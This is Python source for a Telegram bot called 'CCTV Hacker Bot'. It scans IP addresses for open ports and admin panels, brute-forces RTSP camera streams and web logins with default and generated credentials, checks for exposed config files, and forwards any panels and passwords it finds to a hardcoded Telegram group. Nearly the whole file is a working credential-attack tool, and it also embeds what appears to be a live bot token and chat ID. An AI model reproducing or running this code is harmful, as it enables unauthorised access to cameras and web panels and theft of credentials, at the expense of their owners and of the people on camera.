import os
import asyncio
import socket
import logging
import re
import base64
import random
import string
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)
from aiohttp import ClientSession, ClientTimeout

# Configure logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.DEBUG
)
logger = logging.getLogger(__name__)

# Conversation states
IP, PORT = range(2)

# Common CCTV credentials
CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", ""),
    ("root", "root"),
    ("root", ""),
    ("admin", "666666"),
    ("admin", "password"),
    ("user", "user"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "1234"),
    ("root", "12345"),
    ("user", "12345"),
]

# Base usernames and passwords for brute-forcing
BASE_USERNAMES = ["admin", "root", "user", "guest", "support", "manager", "test", "sysadmin"]
BASE_PASSWORDS = [
    "admin", "12345", "password", "123456", "admin123", "1234", "666666", "password123",
    "adminadmin", "root", "qwerty", "letmein", "welcome", "camera", "security", "000000",
    "111111", "123123", "abc123", "pass123"
]

# Generate 2000 random username-password combos
def generate_random_combos(count=2000):
    combos = [(u, p) for u in BASE_USERNAMES for p in BASE_PASSWORDS]
    while len(combos) < count:
        username = random.choice(BASE_USERNAMES) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        combos.append((username, password))
    random.shuffle(combos)
    return combos[:count]

BRUTE_COMBOS = generate_random_combos(2000)

# Expanded admin paths
ADMIN_PATHS = [
    "/login", "/admin", "/signin", "/", "/dashboard", "/control", "/wp-admin",
    "/login.php", "/admin/login", "/panel", "/default.html", "/index.html",
    "/home", "/config", "/adminpanel", "/login.asp", "/sysadmin", "/webadmin",
    "/backend", "/admin/index.php"
]

# Common ports
COMMON_PORTS = [80, 443, 8080, 8443]

# Vulnerability database
VULN_DB = {
    "wordpress": {
        "version_pattern": r"WordPress\s*(\d+\.\d+\.\d+)",
        "vulnerable_versions": ["4.9.8", "5.0.0"],
        "cve": "CVE-2019-6715",
        "mitigation": "Update to WordPress 6.0+"
    },
    "default_creds": {
        "check": [("admin", "admin"), ("admin", "password")],
        "cve": "N/A",
        "mitigation": "Change default credentials"
    },
    "config_exposure": {
        "paths": ["/wp-config.php", "/config.php"],
        "cve": "N/A",
        "mitigation": "Restrict file access"
    }
}

# Environment variables
TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the conversation."""
    keyboard = [
        [InlineKeyboardButton("Start Hack", callback_data="start_hack")],
        [InlineKeyboardButton("Help", callback_data="help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 CCTV Hacker Bot! 🚀\n"
        "Scan CCTVs or admin panels. Use /hack for advanced options, /checklink <url>, or /vuln for vulnerabilities.\n"
        "Click 'Start Hack' or 'Help'!",
        reply_markup=reply_markup
    )
    return IP

async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Provide advanced hack options."""
    keyboard = [
        [InlineKeyboardButton("Special Admin Scan", callback_data="special_scan")],
        [InlineKeyboardButton("Brute-Force", callback_data="brute_force")],
        [InlineKeyboardButton("Standard Scan", callback_data="start_hack")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 Advanced Hack Options:\n"
        "- Special Admin Scan: Check all admin paths\n"
        "- Brute-Force: Try 2000+ credentials\n"
        "- Standard Scan: Basic IP/port scan\n"
        "Choose an option:",
        reply_markup=reply_markup
    )

async def start_hack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Standard Scan."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter IP (e.g., 192.168.1.1):")
    context.user_data["scan_type"] = "standard"
    return IP

async def special_scan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Special Admin Scan."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter IP for deep admin panel scan:")
    context.user_data["scan_type"] = "special"
    return IP

async def brute_force_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle Brute-Force."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text("Enter IP for brute-force attack:")
    context.user_data["scan_type"] = "brute"
    return IP

async def help_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Help."""
    query = update.callback_query
    await query.answer()
    await query.message.reply_text(
        "📚 Help - CCTV Hacker Bot\n"
        "1. /start: Basic scan\n"
        "2. /hack: Advanced options\n"
        "3. /checklink <url>: Check URL\n"
        "4. /vuln: Scan vulnerabilities\n"
        "5. Enter IP/port or blank for common ports\n"
        "6. Inline buttons for check/brute-force\n"
        "⚠️ Use ethically!"
    )

async def check_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check if a URL is an admin panel."""
    if not context.args:
        await update.message.reply_text("Provide a URL (e.g., /checklink http://192.168.8.20:80/login).")
        return

    url = context.args[0].strip()
    logger.debug(f"Checking URL: {url}")
    try:
        parsed_url = urlparse(url)
        ip = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        path = parsed_url.path or "/"

        if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
            await update.message.reply_text("Invalid IP!")
            return

        if not await check_port(ip, port):
            await update.message.reply_text(f"❌ Port {port} closed on {ip}.")
            return

        # Get geolocation
        geo = await get_geo(ip, context)
        geo_text = f"🌍 Location: {geo}\n" if geo != "Unknown" else ""

        is_admin, details = await check_admin_panel(url)
        panel_name = path.strip("/") or "root"

        if is_admin:
            keyboard = [[InlineKeyboardButton(f"Brute-Force {panel_name}", callback_data=f"hunt_{ip}_{port}_{url}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                f"{geo_text}✅ **Admin Panel**: {panel_name} 🎯\nURL: {url}\nDetails: {', '.join(details)}",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
            context.user_data.setdefault("admin_pages", []).append(url)
            try:
                await context.bot.send_message(
                    chat_id=GROUP_CHAT_ID,
                    text=f"{geo_text}✅ **Admin Panel** for {ip}:{port}!\nURL: {url}\nDetails: {', '.join(details)}",
                    parse_mode="Markdown"
                )
            except Exception as e:
                logger.error(f"Group send error: {e}")
        else:
            await update.message.reply_text(f"{geo_text}❌ No admin panel at {url}.\nDetails: {', '.join(details)}")

    except Exception as e:
        logger.error(f"URL check error: {e}")
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def vuln_scan(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Scan admin panels for vulnerabilities."""
    admin_pages = context.user_data.get("admin_pages", [])
    if not admin_pages:
        await update.message.reply_text("No admin pages to scan. Run /hack or /checklink first.")
        return

    await update.message.reply_text("🔍 Scanning for vulnerabilities...")
    results = []
    semaphore = asyncio.Semaphore(5)

    async def check_vuln(url: str) -> list:
        vulns = []
        async with semaphore:
            try:
                async with ClientSession(timeout=ClientTimeout(total=3)) as session:
                    async with session.get(url, ssl=False, allow_redirects=True) as response:
                        html = await response.text()
                        headers = response.headers
                        # Check WordPress version
                        if "wordpress" in html.lower():
                            version_match = re.search(VULN_DB["wordpress"]["version_pattern"], html, re.I)
                            if version_match and version_match.group(1) in VULN_DB["wordpress"]["vulnerable_versions"]:
                                vulns.append(
                                    f"⚠️ Vulnerable WordPress {version_match.group(1)} ({VULN_DB['wordpress']['cve']})"
                                    f" - {VULN_DB['wordpress']['mitigation']}"
                                )
                        # Check default creds
                        for username, password in VULN_DB["default_creds"]["check"]:
                            async with session.post(url, data={"username": username, "password": password}, ssl=False) as resp:
                                if resp.status == 200 and "dashboard" in (await resp.text()).lower():
                                    vulns.append(
                                        f"⚠️ Default creds work: {username}:{password}"
                                        f" - {VULN_DB['default_creds']['mitigation']}"
                                    )
                        # Check config exposure
                        for path in VULN_DB["config_exposure"]["paths"]:
                            config_url = url.rsplit("/", 1)[0] + path
                            async with session.get(config_url, ssl=False) as resp:
                                if resp.status == 200 and "db_password" in (await resp.text()).lower():
                                    vulns.append(
                                        f"⚠️ Exposed config: {config_url}"
                                        f" - {VULN_DB['config_exposure']['mitigation']}"
                                    )
            except Exception as e:
                vulns.append(f"Error scanning {url}: {str(e)}")
        return vulns

    tasks = [check_vuln(url) for url in admin_pages]
    vuln_results = await asyncio.gather(*tasks)
    for url, vulns in zip(admin_pages, vuln_results):
        if vulns:
            results.append(f"🔍 {url}:\n" + "\n".join(vulns))
        else:
            results.append(f"🔍 {url}: No vulnerabilities found.")

    await update.message.reply_text("\n\n".join(results) or "No vulnerabilities detected.", parse_mode="Markdown")

async def get_geo(ip: str, context: ContextTypes.DEFAULT_TYPE) -> str:
    """Fetch geolocation for an IP, with caching."""
    if not hasattr(context.user_data, "geo_cache"):
        context.user_data["geo_cache"] = {}
    if ip in context.user_data["geo_cache"]:
        return context.user_data["geo_cache"][ip]
    try:
        async with ClientSession(timeout=ClientTimeout(total=3)) as session:
            async with session.get(f"http://ip-api.com/json/{ip}") as response:
                if response.status == 200:
                    data = await response.json()
                    geo = f"{data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}"
                    context.user_data["geo_cache"][ip] = geo
                    return geo
                return "Unknown"
    except Exception as e:
        logger.error(f"Geo error for {ip}: {e}")
        return "Unknown"

async def check_admin_panel(url: str) -> tuple[bool, list]:
    """Check if a URL is an admin panel."""
    details = []
    try:
        async with ClientSession(timeout=ClientTimeout(total=3)) as session:
            async with session.get(url, ssl=False, allow_redirects=True) as response:
                status = response.status
                html = await response.text()
                headers = response.headers

                is_admin = False
                if re.search(r'<form.*?(username|login|email|password).*?>', html, re.I | re.S):
                    is_admin = True
                    details.append("Login form detected")
                keywords = ["username", "password", "login", "admin", "dashboard", "control panel", "sign in"]
                if any(keyword in html.lower() for keyword in keywords):
                    is_admin = True
                    details.append("Admin keywords found")
                server = headers.get("Server", "").lower()
                powered_by = headers.get("X-Powered-By", "").lower()
                if any(sig in server or sig in powered_by for sig in ["apache", "nginx", "wordpress"]):
                    details.append(f"Server: {server or powered_by}")
                if status in [401, 403]:
                    details.append("Unauthorized/Forbidden")
                    is_admin = True

                return is_admin, details or ["No admin indicators"]
    except Exception as e:
        return False, [f"Error: {str(e)}"]

async def ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Store IP and ask for port."""
    ip = update.message.text.strip()
    logger.debug(f"Received IP: {ip}")
    if not re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip):
        await update.message.reply_text("Invalid IP! Use IPv4 (e.g., 192.168.1.1).")
        return IP
    context.user_data["ip"] = ip
    await update.message.reply_text("Enter port (e.g., 80, 8443) or leave blank:")
    return PORT

async def port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process IP and port, perform scan."""
    ip = context.user_data.get("ip")
    port_input = update.message.text.strip()
    scan_type = context.user_data.get("scan_type", "standard")
    logger.debug(f"Received port: {port_input}, scan_type: {scan_type}")

    ports_to_scan = COMMON_PORTS
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
            ports_to_scan = [port]
        except ValueError:
            await update.message.reply_text("Invalid port! Use 1-65535 or leave blank.")
            return PORT

    results = []
    potential_links = []
    admin_pages = []
    inline_buttons = []

    # Get geolocation
    geo = await get_geo(ip, context)
    geo_text = f"🌍 Location: {geo}\n" if geo != "Unknown" else ""

    for port in ports_to_scan:
        port_results, port_links, port_admin_pages = await hack_cctv(ip, port, scan_type, geo_text)
        results.append(port_results)
        potential_links.extend(port_links)
        admin_pages.extend(port_admin_pages)

        for admin_url in port_admin_pages:
            inline_buttons.append([
                InlineKeyboardButton(f"Check {admin_url}", url=admin_url),
                InlineKeyboardButton(f"Brute-Force {admin_url.split('/')[-1]}", callback_data=f"hunt_{ip}_{port}_{admin_url}")
            ])

    if potential_links or admin_pages:
        inline_buttons.append([InlineKeyboardButton("Hunt Password (All)", callback_data=f"hunt_{ip}_{ports_to_scan[0]}")])

    reply_markup = InlineKeyboardMarkup(inline_buttons)
    results_text = "\n\n".join(results)
    await update.message.reply_text(results_text, reply_markup=reply_markup, parse_mode="Markdown")

    if admin_pages:
        await update.message.reply_text(
            f"✅ **Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages]),
            parse_mode="Markdown"
        )

    try:
        group_message = f"Results for {ip}\n\n{results_text}"
        if admin_pages:
            group_message += "\n✅ **Admin Pages**:\n" + "\n".join([f"- {url}" for url in admin_pages])
        await context.bot.send_message(chat_id=GROUP_CHAT_ID, text=group_message, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"Group send error: {e}")

    context.user_data["potential_links"] = potential_links
    context.user_data["admin_pages"] = admin_pages
    context.user_data["brute_force_running"] = False
    return ConversationHandler.END

async def hack_cctv(ip: str, port: int, scan_type: str, geo_text: str) -> tuple[str, list, list]:
    """Perform CCTV scan based on scan_type."""
    results = [f"📡 Scanning {ip}:{port} ({scan_type})..."]
    if geo_text:
        results.append(geo_text)
    potential_links = []
    admin_pages = []
    open_paths = []
    semaphore = asyncio.Semaphore(10)

    if not await check_port(ip, port):
        results.append("❌ Port closed.")
        return "\n".join(results), potential_links, admin_pages

    results.append(f"✅ Port {port} open!")
    service = "http" if port in [80, 443, 8080, 8443] else "rtsp"
    results.append(f"Service: {service}")

    async def check_path(protocol: str, path: str) -> tuple[bool, str, list]:
        async with semaphore:
            url = f"{protocol}://{ip}:{port}{path}"
            logger.debug(f"Checking path: {url}")
            try:
                async with ClientSession(timeout=ClientTimeout(total=3)) as session:
                    async with session.get(url, ssl=False, allow_redirects=True) as response:
                        status = response.status
                        html = await response.text()
                        is_admin, details = await check_admin_panel(url)
                        return is_admin, url, details
            except Exception as e:
                return False, url, [f"Error: {str(e)}"]

    if service == "http" and scan_type in ["standard", "special"]:
        protocols = ["http", "https"] if port in [443, 8443] else ["http"]
        tasks = [check_path(protocol, path) for protocol in protocols for path in ADMIN_PATHS]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for is_admin, url, details in responses:
            if is_admin:
                admin_pages.append(url)
                results.append(f"✅ **Admin Page** 🎯: {url} ({', '.join(details)})")
            else:
                results.append(f"✅ Path: {url} (No admin)")
            open_paths.append(url.split("/")[-1])

        results.append(f"Paths Checked: {len(open_paths)}/{len(ADMIN_PATHS) * len(protocols)}")

    if service == "rtsp" and scan_type == "standard":
        for username, password in CREDENTIALS:
            rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
            is_valid, error = await validate_rtsp(ip, port, username, password)
            if is_valid:
                potential_links.append((rtsp_url, username, password))
                results.append(f"✅ RTSP Success: {username}:{password}")
            else:
                results.append(f"❌ RTSP Failed: {error}")

    if scan_type == "brute":
        results.append("🔥 Brute-forcing credentials...")
        for username, password in BRUTE_COMBOS[:100]:
            is_valid, error = await validate_rtsp(ip, port, username, password)
            if is_valid:
                rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/live"
                potential_links.append((rtsp_url, username, password))
                results.append(f"🎯 Found: {username}:{password}")
            async with ClientSession(timeout=ClientTimeout(total=3)) as session:
                for path in ADMIN_PATHS:
                    url = f"http://{ip}:{port}{path}"
                    try:
                        async with session.post(url, data={"username": username, "password": password}, ssl=False) as response:
                            if response.status == 200:
                                html = await response.text()
                                if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
                                    admin_pages.append(url)
                                    results.append(f"🎯 Found Admin: {url} ({username}:{password})")
                    except Exception:
                        pass

    results.append("⚠️ Use ethically and legally.")
    return "\n".join(results), potential_links, admin_pages

async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Brute-force credentials with progress in inline buttons."""
    query = update.callback_query
    await query.answer()
    data = query.data.split("_")
    ip = data[1]
    port = int(data[2])
    specific_url = data[3] if len(data) > 3 else None

    potential_links = context.user_data.get("potential_links", [])
    admin_pages = [specific_url] if specific_url else context.user_data.get("admin_pages", [])

    if not (potential_links or admin_pages):
        await query.message.reply_text("No targets to brute-force. Run /hack or /checklink.")
        return

    context.user_data["brute_force_running"] = True
    target = specific_url or f"{ip}:{port}"
    await query.message.reply_text(f"🔥 Brute-forcing {target} with {len(BRUTE_COMBOS)} combos...")

    total_combos = len(BRUTE_COMBOS)
    checked = 0
    live_links = []
    progress_message = await query.message.reply_text("Starting brute-force...")
    progress_button = await query.message.reply_text(
        "Progress: 0%",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("Progress: 0%", callback_data="progress_dummy"),
            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{specific_url or 'all'}")
        ]])
    )

    semaphore = asyncio.Semaphore(10)
    async def try_creds(url: str, username: str, password: str) -> bool:
        async with semaphore:
            try:
                async with ClientSession(timeout=ClientTimeout(total=3)) as session:
                    async with session.post(
                        url,
                        data={"username": username, "password": password},
                        ssl=False,
                        allow_redirects=True
                    ) as response:
                        if response.status == 200:
                            html = await response.text()
                            if any(keyword in html.lower() for keyword in ["dashboard", "admin"]):
                                return True
                        return False
            except Exception:
                return False

    for admin_url in admin_pages:
        if not context.user_data.get("brute_force_running", False):
            break
        for username, password in BRUTE_COMBOS:
            if not context.user_data.get("brute_force_running", False):
                break
            success = await try_creds(admin_url, username, password)
            checked += 1
            if success:
                live_links.append(admin_url)
                await query.message.reply_text(
                    f"🎯 Found: {username}:{password}\nURL: {admin_url}",
                    parse_mode="Markdown"
                )
                try:
                    await context.bot.send_message(
                        chat_id=GROUP_CHAT_ID,
                        text=f"🎯 Found for {ip}:{port}!\n{username}:{password}\n{admin_url}",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.error(f"Group send error: {e}")

            if checked % 100 == 0 or checked == total_combos:
                progress = (checked / total_combos) * 100
                try:
                    await context.bot.edit_message_reply_markup(
                        chat_id=progress_button.chat_id,
                        message_id=progress_button.message_id,
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton(f"Progress: {progress:.0f}%", callback_data="progress_dummy"),
                            InlineKeyboardButton("Stop Brute-Force", callback_data=f"stop_{ip}_{port}_{specific_url or 'all'}")
                        ]])
                    )
                    await context.bot.edit_message_text(
                        chat_id=progress_message.chat_id,
                        message_id=progress_message.message_id,
                        text=f"Progress: {progress:.0f}% ({checked}/{total_combos} combos)"
                    )
                except Exception as e:
                    logger.error(f"Progress update error: {e}")

    final_text = f"✅ Done! Checked {checked}/{total_combos}" if context.user_data.get("brute_force_running", False) else f"🛑 Stopped! Checked {checked}/{total_combos}"
    await context.bot.edit_message_text(
        chat_id=progress_message.chat_id,
        message_id=progress_message.message_id,
        text=final_text
    )
    await context.bot.edit_message_reply_markup(
        chat_id=progress_button.chat_id,
        message_id=progress_button.message_id,
        reply_markup=None
    )

    if live_links:
        await query.message.reply_text(
            f"🎉 Found {len(live_links)} links:\n" + "\n".join(live_links),
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("❌ No new links found.")

    context.user_data["brute_force_running"] = False

async def stop_brute_force(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop brute-force."""
    query = update.callback_query
    await query.answer()
    context.user_data["brute_force_running"] = False
    await query.message.reply_text("🛑 Brute-force stopped.")

async def check_port(ip: str, port: int) -> bool:
    """Check if port is open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception as e:
        logger.error(f"Port check error: {e}")
        return False

async def validate_rtsp(ip: str, port: int, username: str, password: str) -> tuple[bool, str]:
    """Validate RTSP credentials."""
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        request = f"DESCRIBE rtsp://{ip}:{port}/live RTSP/1.0\r\nCSeq: 1\r\n"
        if username and password:
            auth = f"{username}:{password}".encode('ascii')
            auth_b64 = base64.b64encode(auth).decode('ascii')
            request += f"Authorization: Basic {auth_b64}\r\n"
        request += "\r\n"
        writer.write(request.encode('ascii'))
        await writer.drain()
        response = await asyncio.wait_for(reader.read(1024), timeout=3)
        response_str = response.decode('ascii', errors='ignore')
        writer.close()
        await writer.wait_closed()
        return "RTSP/1.0 200 OK" in response_str, "Success" if "200 OK" in response_str else response_str[:50]
    except Exception as e:
        return False, str(e)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel conversation."""
    await update.message.reply_text("Cancelled. Use /start or /hack.")
    return ConversationHandler.END

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check bot status."""
    await update.message.reply_text("Bot online! Use /start, /hack, /checklink, or /vuln.")

async def keep_alive():
    """Keep-alive server for Koyeb."""
    import http.server
    import socketserver
    class Handler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == "/health":
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"OK")
            else:
                self.send_response(404)
                self.end_headers()
    server = socketserver.TCPServer(("", KEEP_ALIVE_PORT), Handler)
    logger.info(f"Keep-alive on port {KEEP_ALIVE_PORT}")
    server.serve_forever()

def run_keep_alive(loop):
    """Run keep_alive in a separate event loop."""
    asyncio.set_event_loop(loop)
    loop.run_until_complete(keep_alive())

def main() -> None:
    """Run the bot."""
    application = Application.builder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start), CommandHandler("hack", hack)],
        states={
            IP: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, ip),
                CallbackQueryHandler(start_hack_callback, pattern="^start_hack$"),
                CallbackQueryHandler(special_scan_callback, pattern="^special_scan$"),
                CallbackQueryHandler(brute_force_callback, pattern="^brute_force$"),
                CallbackQueryHandler(help_callback, pattern="^help$"),
            ],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, port)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("checklink", check_link))
    application.add_handler(CommandHandler("vuln", vuln_scan))
    application.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt_"))
    application.add_handler(CallbackQueryHandler(stop_brute_force, pattern="^stop_"))

    import threading
    keep_alive_loop = asyncio.new_event_loop()
    threading.Thread(target=run_keep_alive, args=(keep_alive_loop,), daemon=True).start()

    application.run_polling()

if __name__ == "__main__":
    main()
